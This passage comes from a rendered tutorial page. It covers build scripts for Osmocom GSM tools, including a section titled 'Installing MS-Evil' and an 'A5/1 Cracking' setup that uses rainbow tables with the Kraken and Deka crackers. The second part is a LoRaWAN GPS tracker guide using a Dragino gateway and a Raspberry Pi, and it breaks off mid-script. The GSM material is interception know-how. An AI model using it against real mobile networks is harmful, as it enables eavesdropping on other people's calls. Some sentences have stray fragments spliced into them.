<span id="cb42-28"><a href="#cb42-28" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> libortp-dev</span>
<span id="cb42-29"><a href="#cb42-29" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb42-30"><a href="#cb42-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-31"><a href="#cb42-31" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb42-32"><a href="#cb42-32" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmocom-bb/src</span>
<span id="cb42-33"><a href="#cb42-33" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span>
<span id="cb42-34"><a href="#cb42-34" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span>
<span id="cb42-35"><a href="#cb42-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-36"><a href="#cb42-36" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb42-37"><a href="#cb42-37" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-abis</span>
<span id="cb42-38"><a href="#cb42-38" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-abis</span>
<span id="cb42-39"><a href="#cb42-39" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb42-40"><a href="#cb42-40" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--disable-dahdi</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb42-41"><a href="#cb42-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-42"><a href="#cb42-42" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb42-43"><a href="#cb42-43" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-netif</span>
<span id="cb42-44"><a href="#cb42-44" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-netif</span>
<span id="cb42-45"><a href="#cb42-45" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.6.0</span>
<span id="cb42-46"><a href="#cb42-46" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb42-47"><a href="#cb42-47" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb42-48"><a href="#cb42-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-49"><a href="#cb42-49" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> bsc-2rfa/openbsc</span>
<span id="cb42-50"><a href="#cb42-50" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span></span>
<span id="cb42-51"><a href="#cb42-51" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb42-52"><a href="#cb42-52" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmo-bts</span>
<span id="cb42-53"><a href="#cb42-53" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmo-bts</span>
<span id="cb42-54"><a href="#cb42-54" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb42-55"><a href="#cb42-55" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--enable-trx</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb42-56"><a href="#cb42-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-57"><a href="#cb42-57" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install ruby-libxml ruby-dev ruby-dbus</span>
<span id="cb42-58"><a href="#cb42-58" aria-hidden="true" tabindex="-1"></a><span class="ex">gem</span> install serial smartcard</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-ms-evil-3" class="level2">
<h2 class="anchored" data-anchor-id="installing-ms-evil-3">Installing MS-Evil</h2>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb43-9"><a href="#cb43-9" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb43-10"><a href="#cb43-10" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb43-11"><a href="#cb43-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.9.0</span>
<span id="cb43-12"><a href="#cb43-12" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb43-13"><a href="#cb43-13" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb43-14"><a href="#cb43-14" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb43-15"><a href="#cb43-15" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb43-16"><a href="#cb43-16" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb43-17"><a href="#cb43-17" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb43-18"><a href="#cb43-18" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb43-19"><a href="#cb43-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb43-20"><a href="#cb43-20" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb43-21"><a href="#cb43-21" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb43-22"><a href="#cb43-22" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb43-23"><a href="#cb43-23" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb43-24"><a href="#cb43-24" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb43-25"><a href="#cb43-25" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb43-26"><a href="#cb43-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-27"><a href="#cb43-27" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../bb-2rfa/src</span>
<span id="cb43-28"><a href="#cb43-28" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="a51-cracking-1" class="level1">
<h1>A5/1 Cracking :</h1>
<p>Download the tables :</p>
<p><a href="https://infocon.org/rainbow%20tables/A51/">a51_tables</a></p>
<p>Prepare them :</p>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a><span class="va">offset_total</span><span class="op">=</span>0</span>
<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 0 <span class="op">&gt;</span> test</span>
<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> abblay <span class="kw">in</span> <span class="va">$echo</span> <span class="va">$(</span><span class="fu">ls</span> /media/<span class="va">$USER</span>/tables<span class="va">)</span> <span class="kw">;</span> <span class="cf">do</span> <span class="va">abblay2</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$abblay</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">'s/.dlt//g'</span><span class="va">)</span><span class="kw">;</span></span>
<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /media/<span class="va">$USER</span>/indexes/</span>
<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/media/</span><span class="va">$USER</span><span class="ex">/indexes/kraken/TableConvert/TableConvert</span> di /media/<span class="va">$USER</span>/tables/<span class="va">$abblay2</span>.dlt <span class="va">$abblay2</span>.ins:<span class="va">$offset_total</span> <span class="va">$abblay2</span>.idx</span>
<span id="cb44-8"><a href="#cb44-8" aria-hidden="true" tabindex="-1"></a><span class="va">taille_arrondie</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$((</span> <span class="va">$((</span> <span class="va">$(</span><span class="fu">stat</span> <span class="at">-c%s</span> <span class="va">$abblay2</span>.ins<span class="va">)</span><span class="op">/</span><span class="dv">4096</span> <span class="va">))</span> <span class="op">+</span><span class="dv">1</span> <span class="va">))</span> <span class="pp">*</span>4096 <span class="kw">|</span> <span class="fu">bc</span><span class="va">)</span></span>
<span id="cb44-9"><a href="#cb44-9" aria-hidden="true" tabindex="-1"></a><span class="va">offset_total</span><span class="op">=</span><span class="va">$(($taille_arrondie</span> <span class="op">+</span> <span class="va">$offset_total))</span></span>
<span id="cb44-10"><a href="#cb44-10" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$taille_arrondie</span> <span class="op">&gt;&gt;</span> test</span>
<span id="cb44-11"><a href="#cb44-11" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
<span id="cb44-12"><a href="#cb44-12" aria-hidden="true" tabindex="-1"></a><span class="fu">awk</span> <span class="st">'{S+=$0}{print S}END{}'</span> test <span class="op">&gt;</span> offsets</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone http://jenda.hrach.eu/p/deka</span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/0x7678/typhon-vx/tree/master/kraken </span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> add-apt-repository ppa:deadsnakes/ppa</span>
<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update</span>
<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install python3.7 python3.7-dev nvidia-utils-515-server xserver-xorg-video-nvidia-515</span>
<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3.7 <span class="at">-m</span> pip install pyopencl numpy scipy</span>
<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> deka</span>
<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a><span class="ex">./genkernel64.sh</span> <span class="op">&gt;</span> slice.c</span>
<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="at">-e</span> <span class="st">'s/3.5m/3.7m/g'</span> Makefile</span>
<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="lora" class="level1">
<h1><strong>Lora :</strong></h1>
</section>
<section id="gps-tracker-via-lorawan" class="level1">
<h1><strong>GPS tracker via LoraWAN</strong></h1>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="uml.png"><img src="uml.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">UML</figcaption>
</figure>
</div>
<p>ISO : <a href="https://drive.google.com/file/d/1YTdmb8JlvePSKiniwBKYyqXx-m-NhzIe/view?usp=sharing" class="uri">https://drive.google.com/file/d/1YTdmb8JlvePSKiniwBKYyqXx-m-NhzIe/view?usp=sharing</a></p>
<p><strong>Installation du routeur sur Internet (via WiFi)</strong></p>
<p>N.B. : Pourquoi via WiFi ? Dans le cas particulier de l'Université de Perpignan Via Domitia, le FireWall "n'aime" pas les connections sur le port 1700 nécessaire à l'établissement de la connection routeur -&gt; TheThingsNetwork.</p>
<ul>
<li>Plug on sector the gateway with USB-C 5V-2A a WiFi network dragino-XXXXXX apparait.</li>
<li>Connect to it via the password "dragino+dragino"</li>
<li>Go on the webbrowser on IP 10.130.1.1 an Id/Pwd is asked by the dragino (by default) "root" / "dragino"</li>
<li>Connect via the WiFi Mesh the dragino as a client to your smartphone or your box for example</li>
</ul>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="WiFi_Dragino.png"><img src="WiFi_Dragino.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">WiFi_Dragino</figcaption>
</figure>
</div>
<p><strong>Routage des paquets LoRa vers TheThingsNetwork</strong></p>
<ul>
<li>Create a thethingsnetwork account (free, need email)</li>
<li>We can see the Gateway EUI on the LoRa tab of the network interface</li>
<li>We have to choose now TheThingsNetwork v3 on the defilant menu beside (the thingsnetwork v is avaible but not deserved for new gateways on TTN)</li>
<li>On the second defilant menu choose eu1.cloud.thethings.network</li>
</ul>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="config_gw_ttn.png"><img src="config_gw_ttn.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">config_gw_ttn</figcaption>
</figure>
</div>
<p>On thethingsnetwork :</p>
<p>Fill the Gateway EUI same as precedent configuration on the dragino. Le GatewayID is free but must be unique and available on TTN. The gateway name is totally free of choice. Enfin les Gateway Server Address doit correspondre au précedent soit pour l'Europe : eu1.cloud.thethings.network</p>
<p>The last option can be let as it is.</p>
<p>You have now your gateway connected to LoRaWAN</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="config_ttn_gw.png"><img src="config_ttn_gw.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">config_ttn_gw</figcaption>
</figure>
</div>
<p><strong>Preparation of the RaspberryPi (the connected object) :</strong> A raspberry is a minicomputer of the height approximatively of a Bank card with the power of a smartphone et a I/O electrical pinout. The Operationnal System of this hardware is often (and in this study) on a micro-SD card (it can be Netboot, USB/HDD, eMMC). We gonna greate the SD card with this methodology :</p>
<p><strong>The SD-Card :</strong></p>
<p>Download Raspi-Imager from <a href="https://www.raspberrypi.com/software/" class="uri">https://www.raspberrypi.com/software/</a></p>
<p>To install it on Ubuntu &gt; 20.04 you just have to do (Ctrl-Alt-t) and type</p>
<div class="sourceCode" id="cb46"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> snap install rpi-imager</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Then we download the Debian Bullseye OS</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="choose_os.png"><img src="choose_os.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">choose_os</figcaption>
</figure>
</div>
<p>we select the following options ssh : username/password (advice : "pi"/"raspberry") Wifi : from the phone or any you have available optional : set hostname = raspberry.local</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="options_sd_rpi.png"><img src="options_sd_rpi.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">options_sd_rpi</figcaption>
</figure>
</div>
<p>We the the media that will be written on Then we put the SD-Card on the raspberry and monitor it via HDMI. Or if you don't have HDMI hardware you can access through SSH. For example if the local network is 192.168.1.0/24 youinstall.packages(‘readr’) can do (on the host)</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> 192.168.1.1-254 <span class="at">-p</span> 22</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>to know RPi IP adress or you can try</p>
<div class="sourceCode" id="cb48"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> arp <span class="at">-a</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Then to spawn a shell on the RPi</p>
<div class="sourceCode" id="cb49"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> pi@ip_found_previously</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>or</p>
<div class="sourceCode" id="cb50"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> pi@raspberrypi.local</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Then on the shell</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update <span class="kw">&amp;&amp;</span> <span class="fu">sudo</span> apt upgrade</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Now we install necessary packages</p>
<div class="sourceCode" id="cb52"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install git device-tree-compiler git python3-crypto python3-nmea2 python3-rpi.gpio python3-serial python3-spidev python3-configobj gpsd libgps-dev gpsd-clients python3-pip</span>
<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install simplecayennelpp</span>
<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/libgps</span>
<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libgps</span>
<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> </span>
<span id="cb52-6"><a href="#cb52-6" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> make install</span>
<span id="cb52-7"><a href="#cb52-7" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ldconfig</span>
<span id="cb52-8"><a href="#cb52-8" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> /etc/default/gpsd</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>``` {.sourceCode .} # Default settings for the gpsd init script and the hotplug wrapper.</p>
</section>
<section id="start-the-gpsd-daemon-automatically-at-boot-time" class="level1">
<h1>Start the gpsd daemon automatically at boot time</h1>
<p>START_DAEMON=“true”</p>
</section>
<section id="use-usb-hotplugging-to-add-new-usb-devices-automatically-to-the-daemon" class="level1">
<h1>Use USB hotplugging to add new USB devices automatically to the daemon</h1>
<p>USBAUTO=“false”</p>
</section>
<section id="devices-gpsd-should-collect-to-at-boot-time." class="level1">
<h1>Devices gpsd should collect to at boot time.</h1>
</section>
<section id="they-need-to-be-readwriteable-either-by-user-gpsd-or-the-group-dialout." class="level1">
<h1>They need to be read/writeable, either by user gpsd or the group dialout.</h1>
<p>DEVICES=“/dev/ttyAMA0”</p>
</section>
<section id="other-options-you-want-to-pass-to-gpsd" class="level1">
<h1>Other options you want to pass to gpsd</h1>
<p>GPSD_OPTIONS=“-n”</p>
<pre><code>
Now we add to /boot/config.txt those lines at the end

``` {.sourceCode .}
enable_uart=1
dtoverlay=miniuart-bt
dtoverlay=spi-gpio-cs</code></pre>
<p>We modify /boot/cmdline.txt to make it looks like</p>
<p><code>{.sourceCode .} dwc_otg.lpm_enable=0 console=tty1 root=/dev/mmcblk0p2 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait</code></p>
<p>Then /home/pi</p>
<div class="sourceCode" id="cb54"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/computenodes/dragino</span>
<span id="cb54-2"><a href="#cb54-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> dragino/overlay</span>
<span id="cb54-3"><a href="#cb54-3" aria-hidden="true" tabindex="-1"></a><span class="ex">dtc</span> <span class="at">-@</span> <span class="at">-I</span> dts <span class="at">-O</span> dtb <span class="at">-o</span> spi-gpio-cs.dtbo spi-gpio-cs-overlay.dts</span>
<span id="cb54-4"><a href="#cb54-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> cp spi-gpio-cs.dtbo /boot/overlays/</span>
<span id="cb54-5"><a href="#cb54-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> reboot</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Then in /home/pi we create gpscron like :</p>
<div class="sourceCode" id="cb55"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 /home/pi/dragino/test_cayenne.py</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>It will be called par cron. (Advice ! Set <code>sudo chmod 644 gpscorn</code> to avoid privilege escalation)</p>
<p>Then we write in /home/pi/dragino : test_cayenne.py like</p>
<div class="sourceCode" id="cb56"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb56-2"><a href="#cb56-2" aria-hidden="true" tabindex="-1"></a><span class="co">"""</span></span>
<span id="cb56-3"><a href="#cb56-3" aria-hidden="true" tabindex="-1"></a><span class="co">    Test harness for dragino module - sends hello world out over LoRaWAN 5 times</span></span>
<span id="cb56-4"><a href="#cb56-4" aria-hidden="true" tabindex="-1"></a><span class="co">"""</span></span>
<span id="cb56-5"><a href="#cb56-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> logging</span>
<span id="cb56-6"><a href="#cb56-6" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> datetime <span class="im">import</span> datetime</span>
<span id="cb56-7"><a href="#cb56-7" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> time <span class="im">import</span> sleep</span>
<span id="cb56-8"><a href="#cb56-8" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> RPi.GPIO <span class="im">as</span> GPIO</span>
<span id="cb56-9"><a href="#cb56-9" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> dragino <span class="im">import</span> Dragino</span>
<span id="cb56-10"><a href="#cb56-10" aria-hidden="true" tabindex="-1"></a><span class="co">#import subprocess</span></span>
<span id="cb56-11"><a href="#cb56-11" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> gpsd</span>
<span id="cb56-12"><a href="#cb56-12" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> simplecayennelpp <span class="im">import</span> CayenneLPP <span class="co"># import the module required to pack th$</span></span>
<span id="cb56-13"><a href="#cb56-13" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> binascii</span>
<span id="cb56-14"><a href="#cb56-14" aria-hidden="true" tabindex="-1"></a><span class="co"># importing the module</span></span>
<span id="cb56-15"><a href="#cb56-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Connect to the local gpsd</span></span>
<span id="cb56-16"><a href="#cb56-16" aria-hidden="true" tabindex="-1"></a>gpsd.<span class="ex">connect</span>()</span>
<span id="cb56-17"><a href="#cb56-17" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> gpsd.get_current()</span>
<span id="cb56-18"><a href="#cb56-18" aria-hidden="true" tabindex="-1"></a><span class="co"># See the inline docs for GpsResponse for the available data</span></span>
<span id="cb56-19"><a href="#cb56-19" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet.position())</span>
<span id="cb56-20"><a href="#cb56-20" aria-hidden="true" tabindex="-1"></a>lat <span class="op">=</span> packet.lat</span>
<span id="cb56-21"><a href="#cb56-21" aria-hidden="true" tabindex="-1"></a>lon <span class="op">=</span> packet.lon</span>
<span id="cb56-22"><a href="#cb56-22" aria-hidden="true" tabindex="-1"></a>alt <span class="op">=</span> packet.alt</span>
<span id="cb56-23"><a href="#cb56-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb56-24"><a href="#cb56-24" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> (lat, lon, alt)</span>
<span id="cb56-25"><a href="#cb56-25" aria-hidden="true" tabindex="-1"></a>lpp <span class="op">=</span> CayenneLPP()</span>
<span id="cb56-26"><a href="#cb56-26" aria-hidden="true" tabindex="-1"></a>lpp.addGPS( <span class="dv">1</span>, lat, lon, alt)</span>
<span id="cb56-27"><a href="#cb56-27" aria-hidden="true" tabindex="-1"></a>text<span class="op">=</span>binascii.hexlify(lpp.getBuffer()).decode()</span>
<span id="cb56-28"><a href="#cb56-28" aria-hidden="true" tabindex="-1"></a>sent<span class="op">=</span><span class="bu">list</span>(binascii.unhexlify(text))</span>
<span id="cb56-29"><a href="#cb56-29" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(text)</span>
<span id="cb56-30"><a href="#cb56-30" aria-hidden="true" tabindex="-1"></a>logLevel<span class="op">=</span>logging.DEBUG</span>
<span id="cb56-31"><a href="#cb56-31" aria-hidden="true" tabindex="-1"></a>logging.basicConfig(filename<span class="op">=</span><span class="st">"test.log"</span>, <span class="bu">format</span><span class="op">=</span><span class="st">'</span><span class="sc">%(asctime)s</span><span class="st"> - </span><span class="sc">%(funcName)s</span><span class="st"> - </span><span class="sc">%(lineno)d</span><span class="st"> - </span><span class="sc">%(levelname)s</span><span class="st"> - </span><span class="sc">%(message)s</span><span class="st">'</span>, level<span class="op">=</span>logLevel)</span>
<span id="cb56-32"><a href="#cb56-32" aria-hidden="true" tabindex="-1"></a>D <span class="op">=</span> Dragino(<span class="st">"/home/pi/dragino/dragino.ini"</span>, logging_level<span class="op">=</span>logLevel)</span>
<span id="cb56-33"><a href="#cb56-33" aria-hidden="true" tabindex="-1"></a>D.join()</span>
<span id="cb56-34"><a href="#cb56-34" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">not</span> D.registered():</span>
